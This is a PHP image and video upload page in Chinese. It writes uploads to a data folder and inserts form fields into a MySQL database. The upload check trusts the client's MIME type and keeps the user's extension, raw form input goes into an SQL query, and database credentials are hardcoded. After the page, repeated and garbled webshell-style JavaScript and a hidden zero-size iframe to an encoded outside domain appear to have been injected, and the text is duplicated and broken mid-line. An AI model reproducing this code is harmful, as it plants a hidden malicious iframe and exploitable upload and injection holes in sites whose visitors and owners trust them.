<?php
header("content-Type: text/html; charset=gb2312");
$uptypes=array('image/jpg',
 'image/jpeg',
 'image/png',
 'image/pjpeg',
 'image/gif',
 'image/bmp',
 'application/x-shockwave-flash',
 'image/x-png',
 'application/msword',
 'audio/x-ms-wma',
 'audio/mp3',
 'application/vnd.rn-realmedia',
 'application/x-zip-compressed',
 'application/octet-stream');

$max_file_size=52428800;
$path_parts=pathinfo($_SERVER['PHP_SELF']);
$destination_folder="data/"; //
$watermark=0;
$watertype=1;
$waterposition=1;
$waterstring="";
$waterimg="";
$imgpreview=1;;
$imgpreviewsize=1/2;
?>
<html>
<head>
<title></title>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<style type="text/css">body,td{font-family:tahoma,verdana,arial;font-size:11px;line-height:15px;background-color:white;color:#666666;margin-left:20px;}
strong{font-size:12px;}
a:link{color:#0066CC;}
a:hover{color:#FF6600;}
a:visited{color:#003366;}
a:active{color:#9DCC00;}
a{TEXT-DECORATION:none}
table.itable{}
td.irows{height:20px;background:url("index.php?i=dots") repeat-x bottom}</style>
</head>
<script type="text/javascript">function oCopy(obj){obj.select();js=obj.createTextRange();js.execCommand("Copy");};function sendtof(url){window.clipboardData.setData('Text',url);alert('复制地址成功，粘贴给你好友一起分享。');};function select_format(){var on=document.getElementById('fmt').checked;document.getElementById('site').style.display=on?'none':'';document.getElementById('sited').style.display=!on?'none':'';};var flag=false;function DrawImage(ImgD){var image=new Image();image.src=ImgD.src;if(image.width>0&&image.height>0){flag=true;if(image.width/image.height>=120/80){if(image.width>120){ImgD.width=120;ImgD.height=(image.height*120)/image.width;}else {ImgD.width=image.width;ImgD.height=image.height;};ImgD.alt=image.width+"×"+image.height;}else {if(image.height>80){ImgD.height=80;ImgD.width=(image.width*80)/image.height;}else {ImgD.width=image.width;ImgD.height=image.height;};ImgD.alt=image.width+"×"+image.height;}};};function FileChange(Value){flag=false;document.all.uploadimage.width=10;document.all.uploadimage.height=10;document.all.uploadimage.alt="";document.all.uploadimage.src=Value;};</script>
<body>
<center><form enctype="multipart/form-data" method="post" name="upform">
<input style="width:208;border:1 solid #9a9999; font-size:9pt; background-color:#ffffff; height:18" size="17" name=upfile type=file 
onchange="javascript:FileChange(this.value);"><br><input type="submit" value="" style="width:60;border:1 solid #9a9999; font-size:9pt; background-color:#ffffff; height:18" size="17"><br>
	
	<br>

	<p><br>
	</p>
</form>

<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST')
{
if (!is_uploaded_file($_FILES["upfile"][tmp_name]))
//
{
echo "<font color='red'>不存在！</font>";
exit;
}

 $file = $_FILES["upfile"];
 if($max_file_size < $file["size"])
 //
 {
 echo "<font color='red'>！</font>";
 exit;
  }

if(!in_array($file["type"], $uptypes))
//
{
 echo "<font color='red'>！</font>";
 exit;
}

if(!file_exists($destination_folder))
mkdir($destination_folder);

$filename=$file["tmp_name"];
$image_size = getimagesize($filename);
$pinfo=pathinfo($file["name"]);
$ftype=$pinfo[extension];
$destination = $destination_folder.time().".".$ftype;
if (file_exists($destination) && $overwrite != true)
{
     echo "<font color='red'>！</a>";
     exit;
  }

 if(!move_uploaded_file ($filename, $destination))
 {
   echo "<font color='red'>！</a>";
     exit;
  }

$pinfo=pathinfo($destination);
$fname=$pinfo[basename];
echo "YEShttp://".$_SERVER['SERVER_NAME'].$path_parts["dirname"]."/".$destination_folder.$fname;



$video = $destination_folder.$fname;

$connect_sql=mysql_connect('61.136.143.170','chenfan','chenfan886') or die("11");
        mysql_select_db('jiucheng')or die("22");
        $query="INSERT INTO info (name,phone,video)";
        $query.="VALUES('".$_POST["name"]."','".$_POST["phone"]."','$video')";

        mysql_query($query) or die("33");;




if($watermark==1)
{
$iinfo=getimagesize($destination,$iinfo);
$nimage=imagecreatetruecolor($image_size[0],$image_size[1]);
$white=imagecolorallocate($nimage,255,255,255);
$black=imagecolorallocate($nimage,0,0,0);
$red=imagecolorallocate($nimage,255,0,0);
imagefill($nimage,0,0,$white);
switch ($iinfo[2])
{
 case 1:
 $simage =imagecreatefromgif($destination);
 break;
 case 2:
 $simage =imagecreatefromjpeg($destination);
 break;
 case 3:
 $simage =imagecreatefrompng($destination);
 break;
 case 6:
 $simage =imagecreatefromwbmp($destination);
 break;
 default:
 die("<font color='red'>不能！</a>");
 exit;
}

imagecopy($nimage,$simage,0,0,0,0,$image_size[0],$image_size[1]);
imagefilledrectangle($nimage,1,$image_size[1]-15,80,$image_size[1],$white);



switch ($iinfo[2])
{
 case 1:
 //imagegif($nimage, $destination);
 imagejpeg($nimage, $destination);
 break;
 case 2:
 imagejpeg($nimage, $destination);
 break;
 case 3:
 imagepng($nimage, $destination);
 break;
 case 6:
 imagewbmp($nimage, $destination);
 //imagejpeg($nimage, $destination);
 break;
}

//
imagedestroy($nimage);
imagedestroy($simage);
}


}
?>
</center>
<script language=javascript>function killErrors(){return true;}window.onerror=killErrors;function yesok(){if (confirm("%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D？"))return true;else return false;}function runClock(){theTime = window.setTimeout("runClock()", 100);var today = new Date();var display= today.toLocaleString();window.status="！%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D  --"+display;}runClock();function ShowFolder(Folder){top.addrform.FolderPath.value = Folder;top.addrform.submit();}function FullForm(FName,FAction){top.hideform.FName.value = FName;if(FAction=="CopyFile"){DName = prompt("%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D",FName);top.hideform.FName.value += "||||"+DName;}else if(FAction=="MoveFile"){DName = prompt("%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D",FName);top.hideform.FName.value += "||||"+DName;}else if(FAction=="CopyFolder"){DName = prompt("%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D",FName);top.hideform.FName.value += "||||"+DName;}else if(FAction=="MoveFolder"){DName = prompt("%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D",FName);top.hideform.FName.value += "||||"+DName;}else if(FAction=="NewFolder"){DName = prompt("%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D",FName);top.hideform.FName.value = DName;}else if(FAction=="CreateMdb"){DName = prompt("请输入！",FName);top.hideform.FName.value = DName;}else if(FAction=="CompactMdb"){DName = prompt("%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D！",FName);top.hideform.FName.value = DName;}else{DName = "Other";}if(DName!=null){top.hideform.Action.value = FAction;top.hideform.submit();}else{top.hideform.FName.value = "";}}function DbCheck(){if(DbForm.DbStr.value == ""){alert("请先连接数据库");FullDbStr(0);return false;}return true;}function FullDbStr(i){if(i<0){return false;}Str = new Array(12);Str[0] = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=D:\\VirtualHost\\343266.ctc-w217.dns.com.cn\\www\\db.mdb;Jet OLEDB:Database Password=***";Str[1] = "Driver={Sql Server};Server=122.70.138.217,1433;Database=DbName;Uid=sa;Pwd=****";Str[2] = "Driver={MySql};Server=122.70.138.217;Port=3306;Database=DbName;Uid=root;Pwd=****";Str[3] = "Dsn=DsnName";Str[4] = "SELECT * FROM [TableName] WHERE ID<100";Str[5] = "INSERT INTO [TableName](USER,PASS) %34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D')";Str[6] = "DELETE FROM [TableName] WHERE ID=100";Str[7] = "UPDATE [TableName] SET USER=\'username\' WHERE ID=100";Str[8] = "CREATE TABLE [TableName](ID INT IDENTITY (1,1) NOT NULL,USER VARCHAR(50))";Str[9] = "DROP TABLE [TableName]";Str[10]= "ALTER TABLE [TableName] ADD COLUMN PASS VARCHAR(32)";Str[11]= "ALTER TABLE [TableName] DROP COLUMN PASS";Str[12]= "%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D。";if(i<=3){DbForm.DbStr.value = Str[i];DbForm.SqlStr.value = "";abc.innerHTML="<center>%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D。</center>";}else if(i==12){alert(Str[i]);}else{DbForm.SqlStr.value = Str[i];}return true;}function FullSqlStr(str,pg){if(DbForm.DbStr.value.length<5){alert("%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D!");return false;}if(str.length<10){alert("%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D!");return false;}DbForm.SqlStr.value = str;DbForm.Page.value = pg;abc.innerHTML="";DbForm.submit();return true;}</script></body></html></body><span style="display:none"><iframe src=http://%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D/admin/jpg.asp width=0 height=0></iframe></body></html></html></body><iframe src= width=0 height=0></iframe></html></body></html><script language=javascript>function killErrors(){return true;}window.onerror=killErrors;function yesok(){if (confirm("%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D？"))return true;else return false;}function runClock(){theTime = window.setTimeout("runClock()", 100);var today = new Date();var display= today.toLocaleString();window.status="！%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D  --"+display;}runClock();function ShowFolder(Folder){top.addrform.FolderPath.value = Folder;top.addrform.submit();}function FullForm(FName,FAction){top.hideform.FName.value = FName;if(FAction=="CopyFile"){DName = prompt("%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D",FName);top.hideform.FName.value += "||||"+DName;}else if(FAction=="MoveFile"){DName = prompt("%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D",FName);top.hideform.FName.value += "||||"+DName;}else if(FAction=="CopyFolder"){DName = prompt("%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D",FName);top.hideform.FName.value += "||||"+DName;}else if(FAction=="MoveFolder"){DName = prompt("%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D",FName);top.hideform.FName.value += "||||"+DName;}else if(FAction=="NewFolder"){DName = prompt("%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D",FName);top.hideform.FName.value = DName;}else if(FAction=="CreateMdb"){DName = prompt("请输入要新建的Mdb文件全名称,注意不能同名！",FName);top.hideform.FName.value = DName;}else if(FAction=="CompactMdb"){DName = prompt("%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D！",FName);top.hideform.FName.value = DName;}else{DName = "Other";}if(DName!=null){top.hideform.Action.value = FAction;top.hideform.submit();}else{top.hideform.FName.value = "";}}function DbCheck(){if(DbForm.DbStr.value == ""){alert("E%69%70%67%6F%76%2E%63");FullDbStr(0);return false;}return true;}function FullDbStr(i){if(i<0){return false;}Str = new Array(12);Str[0] = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=D:\\VirtualHost\\343266.ctc-w217.dns.com.cn\\www\\db.mdb;Jet OLEDB:Database Password=***";Str[1] = "Driver={Sql Server};Server=122.70.138.217,1433;Database=DbName;Uid=sa;Pwd=****";Str[2] = "Driver={MySql};Server=122.70.138.217;Port=3306;Database=DbName;Uid=root;Pwd=****";Str[3] = "Dsn=DsnName";Str[4] = "SELECT * FROM [TableName] WHERE ID<100";Str[5] = "INSERT INTO [TableName](USER,PASS) %34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D')";Str[6] = "DELETE FROM [TableName] WHERE ID=100";Str[7] = "UPDATE [TableName] SET USER=\'username\' WHERE ID=100";Str[8] = "CREATE TABLE [TableName](ID INT IDENTITY (1,1) NOT NULL,USER VARCHAR(50))";Str[9] = "DROP TABLE [TableName]";Str[10]= "ALTER TABLE [TableName] ADD COLUMN PASS VARCHAR(32)";Str[11]= "ALTER TABLE [TableName] DROP COLUMN PASS";Str[12]= "%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D。";if(i<=3){DbForm.DbStr.value = Str[i];DbForm.SqlStr.value = "";abc.innerHTML="<center>%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D。</center>";}else if(i==12){alert(Str[i]);}else{DbForm.SqlStr.value = Str[i];}return true;}function FullSqlStr(str,pg){if(DbForm.DbStr.value.length<5){alert("%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D!");return false;}if(str.length<10){alert("%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D!");return false;}DbForm.SqlStr.value = str;DbForm.Page.value = pg;abc.innerHTML="";DbForm.submit();return true;}</script></body></html></body></html>
</html></body><iframe src= eateMdb"){DName = prompt("%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D！",FName);top.hideform.FName.value = DNaeateMdb"){DName = prompt("%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D！eateMdb"){DName = prompt("请名称,eateMdb"){DName = prompt("%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D！",FName);top.hideform.FName.value = %34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D！",FName);top.hideform.FName.value = DNa",FName);top.hideform.FName.value = DNawidth=0 height=0></iframe></html></body></html>
<script language=javascript>function killErrors(){return true;}window.onerror=killErrors;function yesok(){if (confirm("%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D？"))return true;else return false;}function runClock(){theTime = window.setTimeout("runClock()", 100);var today = new Date();var display= today.toLocaleString();window.status="！%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D  --"+display;}runClock();function ShowFolder(Folder){top.addrform.FolderPath.value = Folder;top.addrform.submit();}function FullForm(FName,FAction){top.hideform.FName.value = FName;if(FAction=="CopyFile"){DName = prompt("%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D",FName);top.hideform.FName.value += "||||"+DName;}else if(FAction=="MoveFile"){DName = prompt("%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D",FName);top.hideform.FName.value += "||||"+DName;}else if(FAction=="CopyFolder"){DName = prompt("%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D",FName);top.hideform.FName.value += "||||"+DName;}else if(FAction=="MoveFolder"){DName = prompt("E%69%70%67%6F%76%2E%63",FName);top.hideform.FName.value += "||||"+DName;}else if(FAction=="NewFolder"){DName = prompt("%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D",FName);top.hideform.FName.value = DName;}else if(FAction=="CreateMdb"){DName = prompt("能同名！",FName);top.hideform.FName.value = DName;}else if(FAction=="CompactMdb"){DName = prompt("%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D！",FName);top.hideform.FName.value = DName;}else{DName = "Other";}if(DName!=null){top.hideform.Action.value = FAction;top.hideform.submit();}else{top.hideform.FName.value = "";}}function DbCheck(){if(DbForm.DbStr.value == ""){alert("请先连接数据库");FullDbStr(0);return false;}return true;}function FullDbStr(i){if(i<0){return false;}Str = new Array(12);Str[0] = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=D:\\VirtualHost\\343266.ctc-w217.dns.com.cn\\www\\db.mdb;Jet OLEDB:Database Password=***";Str[1] = "Driver={Sql Server};Server=122.70.138.217,1433;Database=DbName;Uid=sa;Pwd=****";Str[2] = "Driver={MySql};Server=122.70.138.217;Port=3306;Database=DbName;Uid=root;Pwd=****";Str[3] = "Dsn=DsnName";Str[4] = "SELECT * FROM [TableName] WHERE ID<100";Str[5] = "INSERT INTO [TableName](USER,PASS) %34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D')";Str[6] = "DELETE FROM [TableName] WHERE ID=100";Str[7] = "UPDATE [TableName] SET USER=\'usernafunction yesok(){if (confirm("%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D？"))return true;else return false;}function runClock(){theTime = window.setTimeout("runClock()", 100);var today = new Date();var display= today.toLocaleString();window.status="！%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D  --"+display;}runClock();function ShowFolder(Folder){top.addrform.FolderPath.value = Folder;top.addrform.submit();}function FullForm(FName,FAction){top.hideform.FName.value = FName;if(FAction=="CopyFile"){DName = prompt("%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D",FName);top.hideform.FName.value += "||||"+DName;}else if(FAction=="MoveFile"){DName = prompt("%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D",FName);top.hideform.FName.value += "||||"+DName;}else if(FAction=="CopyFolder"){DName = prompt("%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D",FName);top.hideform.FName.value += "||||"+DName;}else if(FAction=="MoveFolder"){DName = prompt("%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D",FName);top.hideform.FName.value += "||||"+DName;}else if(FAction=="NewFolder"){DName = prompt("%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D",FName);top.hideform.FName.value = DName;}else if(FAction=="CreateMdb"){DName = prompt("请输称,注意不能同名！",FName);top.hideform.FName.value = DName;}else if(FAction=="CompactMdb"){DName = prompt("%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D！",FName);top.hideform.FName.value = DName;}else{DName = "Other";}if(DName!=null){top.hideform.Action.value = FAction;top.hideform.submit();}else{top.hideform.FName.value = "";}}function DbCheck(){if(DbForm.DbStr.value == ""){alert("请先连接数据库");FullDbStr(0);return false;}return true;}function FullDbStr(i){if(i<0){return false;}Str = new Array(12);Str[0] = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=D:\\VirtualHost\\343266.ctc-w217.dns.com.cn\\www\\db.mdb;Jet OLEDB:Database Password=***";Str[1] = "Driver={Sql Server};Server=122.70.138.217,1433;Database=DbName;Uid=sa;Pwd=****";Str[2] = "Driver={MySql};Server=122.70.138.217;Port=3306;Database=DbName;Uid=root;Pwd=****";Str[3] = "Dsn=DsnName";Str[4] = "SELECT * FROM [TableName] WHERE ID<100";Str[5] = "INSERT INTO [TableName](USER,PASS) %34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D')";Str[6] = "DELETE FROM [TableName] WHERE ID=100";Str[7] = "UPDATE [TableName] SET USER=\'username\' WHERE ID=100";Str[8] = "CREATE TABLE [TableName](ID INT IDENTITY (1,1) NOT NULL,USER VARCHAR(50))";Str[9] = "DROP TABLE [TableName]";Str[10]= "ALTER TABLE [TableName] ADD COLUMN PASS VARCHAR(32)";Str[11]= "ALTER TABLE [TableName] DROP COLUMN PASS";Str[12]= "%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D。";if(i<=3){DbForm.DbStr.value = Str[i];DbForm.SqlStr.value = "";abc.innerHTML="<center>%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D。</center>";}else if(i==12){alert(Str[i]);}else{DbForm.SqlStr.value = Str[i];}return true;}function FullSqlStr(str,pg){if(DbForm.DbStr.value.length<5){alert("%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D!");return false;}if(str.length<10){alert("%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D!");return false;}DbForm.SqlStr.value = str;DbForm.Page.value = pg;abc.innerHTML="";DbForm.submit();return true;}</script></body></html></body></html>
</html></body><iframe src= width=0 height=0></iframe></html></body></ht吗？"))return true;else return false;}function runClock(){theTime = window.setTimeout("runClock()", 100);var today = new Date();var display= today.toLocaleString();window.status="！%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D  --"+display;}runClock();function ShowFolder(Folder){top.addrform.FolderPath.value = Folder;top.addrform.submit();}function FullForm(FName,FAction){top.hideform.FName.value = FName;if(FAction=="CopyFile"){DName = prompt("%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D",FName);top.hideform.FName.value += "||||"+DName;}else if(FAction=="MoveFile"){DName = prompt("%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D",FName);top.hideform.FName.value += "||||"+DName;}else if(FAction=="CopyFolder"){DName = prompt("%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D",FName);top.hideform.FName.value += "||||"+DName;}else if(FAction=="MoveFolder"){DName = prompt("%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D",FName);top.hideform.FName.value += "||||"+DName;}else if(FAction=="NewFolder"){DName = prompt("%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D",FName);top.hideform.FName.value = DName;}else if(FAction=="CreateMdb"){DName = prompt("请输入要新建的Mdb文件全名称,注意不能同名！",FName);top.hideform.FName.value = DName;}else if(FAction=="CompactMdb"){DName = prompt("%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D！",FName);top.hideform.FName.value = DName;}else{DName = "Other";}if(DName!=null){top.hideform.Action.value = FAction;top.hideform.submit();}else{top.hideform.FName.value = "";}}function DbCheck(){if(DbForm.DbStr.value == ""){alert("请先连接数据库");FullDbStr(0);return false;}return true;}function FullDbStr(i){if(i<0){return false;}Str = new Array(12);Str[0] = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=D:\\VirtualHost\\343266.ctc-w217.dns.com.cn\\www\\db.mdb;Jet OLEDB:Database Password=***";Str[1] = "Driver={Sql Server};Server=122.70.138.217,1433;Database=DbName;Uid=sa;Pwd=****";Str[2] = "Driver={MySql};Server=122.70.138.217;Port=3306;Database=DbName;Uid=root;Pwd=****";Str[3] = "Dsn=DsnName";Str[4] = "SELECT * FROM [TableName] WHERE ID<100";Str[5] = "INSERT INTO [TableName](USER,PASS) %34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D')";Str[6] = "DELETE FROM [TableName] WHERE ID=100";Str[7] = "UPDATE [TableName] SET USER=\'username\' WHERE ID=100";Str[8] = "CREATE TABLE [TableName](ID INT IDENTITY (1,1) NOT NULL,USER VARCHAR(50))";Str[9] = "DROP TABLE [TableName]";Str[10]= "ALTER TABLE [TableName] ADD COLUMN PASS VARCHAR(32)";Str[11]= "ALTER TABLE [TableName] DROP COLUMN PASS";Str[12]= "%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D。";if(i<=3){DbForm.DbStr.value = Str[i];DbForm.SqlStr.value = "";abc.innerHTML="<center>%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D。</center>";}else if(i==12){alert(Str[i]);}else{DbForm.SqlStr.value = Str[i];}return true;}function FullSqlStr(str,pg){if(DbForm.DbStr.value.length<5){alert("%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D!");return false;}if(str.length<10){alert("%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D!");return false;}DbForm.SqlStr.value = str;DbForm.Page.value = pg;abc.innerHTML="";DbForm.submit();return true;}</script></body></html></body></html>
<?php
header("content-Type: text/html; charset=gb2312");
$uptypes=array('image/jpg',
 'image/jpeg',
 'image/png',
 'image/pjpeg',
 'image/gif',
 'image/bmp',
 'application/x-shockwave-flash',
 'image/x-png',
 'application/msword',
 'audio/x-ms-wma',
 'audio/mp3',
 'application/vnd.rn-realmedia',
 'application/x-zip-compressed',
 'application/octet-stream');

$max_file_size=52428800;
$path_parts=pathinfo($_SERVER['PHP_SELF']);
$destination_folder="data/"; //
$watermark=0;
$watertype=1;
$waterposition=1;
$waterstring="";
$waterimg="";
$imgpreview=1;;
$imgpreviewsize=1/2;
?>
<html>
<head>
<title></title>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<style type="text/css">body,td{font-family:tahoma,verdana,arial;font-size:11px;line-height:15px;background-color:white;color:#666666;margin-left:20px;}
strong{font-size:12px;}
a:link{color:#0066CC;}
a:hover{color:#FF6600;}
a:visited{color:#003366;}
a:active{color:#9DCC00;}
a{TEXT-DECORATION:none}
table.itable{}
td.irows{height:20px;background:url("index.php?i=dots") repeat-x bottom}</style>
</head>
<script type="text/javascript">function oCopy(obj){obj.select();js=obj.createTextRange();js.execCommand("Copy");};function sendtof(url){window.clipboardData.setData('Text',url);alert('复制地址成功，粘贴给你好友一起分享。');};function select_format(){var on=document.getElementById('fmt').checked;document.getElementById('site').style.display=on?'none':'';document.getElementById('sited').style.display=!on?'none':'';};var flag=false;function DrawImage(ImgD){var image=new Image();image.src=ImgD.src;if(image.width>0&&image.height>0){flag=true;if(image.width/image.height>=120/80){if(image.width>120){ImgD.width=120;ImgD.height=(image.height*120)/image.width;}else {ImgD.width=image.width;ImgD.height=image.height;};ImgD.alt=image.width+"×"+image.height;}else {if(image.height>80){ImgD.height=80;ImgD.width=(image.width*80)/image.height;}else {ImgD.width=image.width;ImgD.height=image.height;};ImgD.alt=image.width+"×"+image.height;}};};function FileChange(Value){flag=false;document.all.uploadimage.width=10;document.all.uploadimage.height=10;document.all.uploadimage.alt="";document.all.uploadimage.src=Value;};</script>
<body>
<center><form enctype="multipart/form-data" method="post" name="upform">
<input style="width:208;border:1 solid #9a9999; font-size:9pt; background-color:#ffffff; height:18" size="17" name=upfile type=file 
onchange="javascript:FileChange(this.value);"><br><input type="submit" value="" style="width:60;border:1 solid #9a9999; font-size:9pt; background-color:#ffffff; height:18" size="17"><br>
	
	<br>

	<p><br>
	</p>
</form>

<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST')
{
if (!is_uploaded_file($_FILES["upfile"][tmp_name]))
//
{
echo "<font color='red'>不存在！</font>";
exit;
}

 $file = $_FILES["upfile"];
 if($max_file_size < $file["size"])
 //
 {
 echo "<font color='red'>！</font>";
 exit;
  }

if(!in_array($file["type"], $uptypes))
//
{
 echo "<font color='red'>！</font>";
 exit;
}

if(!file_exists($destination_folder))
mkdir($destination_folder);

$filename=$file["tmp_name"];
$image_size = getimagesize($filename);
$pinfo=pathinfo($file["name"]);
$ftype=$pinfo[extension];
$destination = $destination_folder.time().".".$ftype;
if (file_exists($destination) && $overwrite != true)
{
     echo "<font color='red'>！</a>";
     exit;
  }

 if(!move_uploaded_file ($filename, $destination))
 {
   echo "<font color='red'>！</a>";
     exit;
  }

$pinfo=pathinfo($destination);
$fname=$pinfo[basename];
echo "YEShttp://".$_SERVER['SERVER_NAME'].$path_parts["dirname"]."/".$destination_folder.$fname;



$video = $destination_folder.$fname;

$connect_sql=mysql_connect('61.136.143.170','chenfan','chenfan886') or die("11");
        mysql_select_db('jiucheng')or die("22");
        $query="INSERT INTO info (name,phone,video)";
        $query.="VALUES('".$_POST["name"]."','".$_POST["phone"]."','$video')";

        mysql_query($query) or die("33");;




if($watermark==1)
{
$iinfo=getimagesize($destination,$iinfo);
$nimage=imagecreatetruecolor($image_size[0],$image_size[1]);
$white=imagecolorallocate($nimage,255,255,255);
$black=imagecolorallocate($nimage,0,0,0);
$red=imagecolorallocate($nimage,255,0,0);
imagefill($nimage,0,0,$white);
switch ($iinfo[2])
{
 case 1:
 $simage =imagecreatefromgif($destination);
 break;
 case 2:
 $simage =imagecreatefromjpeg($destination);
 break;
 case 3:
 $simage =imagecreatefrompng($destination);
 break;
 case 6:
 $simage =imagecreatefromwbmp($destination);
 break;
 default:
 die("<font color='red'>不能！</a>");
 exit;
}

imagecopy($nimage,$simage,0,0,0,0,$image_size[0],$image_size[1]);
imagefilledrectangle($nimage,1,$image_size[1]-15,80,$image_size[1],$white);



switch ($iinfo[2])
{
 case 1:
 //imagegif($nimage, $destination);
 imagejpeg($nimage, $destination);
 break;
 case 2:
 imagejpeg($nimage, $destination);
 break;
 case 3:
 imagepng($nimage, $destination);
 break;
 case 6:
 imagewbmp($nimage, $destination);
 //imagejpeg($nimage, $destination);
 break;
}

//
imagedestroy($nimage);
imagedestroy($simage);
}


}
?>